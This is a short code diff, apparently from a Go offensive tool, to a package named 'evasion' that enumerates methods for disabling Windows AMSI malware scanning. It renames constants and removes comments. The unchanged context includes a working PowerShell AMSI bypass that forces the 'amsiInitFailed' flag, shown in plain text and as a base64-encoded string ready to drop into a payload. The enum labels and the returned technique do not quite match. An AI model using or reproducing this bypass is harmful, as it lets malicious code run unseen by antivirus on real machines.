@@ -3,7 +3,6 @@
 package evasion
 
 import (
-	"encoding/binary"
 	"syscall"
 	"unsafe"
 )
@@ -16,13 +15,9 @@ import (
 type AMSIPatchMethod int
 
 const (
-	// PatchAmsiScanBuffer - Patch AmsiScanBuffer to always return clean
 	PatchAmsiScanBuffer AMSIPatchMethod = iota
-	// PatchAmsiScanString - Patch AmsiScanString to always return clean
-	PatchAmsiScanString
-	// PatchAmsiInitialize - Patch AmsiInitialize to fail initialization
-	PatchAmsiInitialize
-	// ForceDisabled - Force amsiInitFailed flag to true
+	PatchAmsiScanStringMethod
+	PatchAmsiInitializeMethod
 	ForceDisabled
 )
 
@@ -244,7 +239,7 @@ func EncodeAMSBypass(method AMSIPatchMethod) string {
 	case PatchAmsiScanBuffer:
 		// PowerShell: [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
 		return "JFJlZl0uQXNzZW1ibHkuR2V0VHlwZSgnU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5BbXNpVXRpbHMnKS5HZXRGaWVsZCgnYW1zaUluaXRGYWlsZWQnLCdOb25QdWJsaWMsU3RhdGljJykuU2V0VmFsdWUoJG51bGwsJHRydWUp"
-	case PatchAmsiInitialize:
+	case PatchAmsiInitializeMethod:
 		return "QW1zaUluaXRpYWxpemUgcGF0Y2hlZCB0byByZXR1cm4gRV9PVVRPRk1FTU9SWQ=="
 	default:
 		return ""
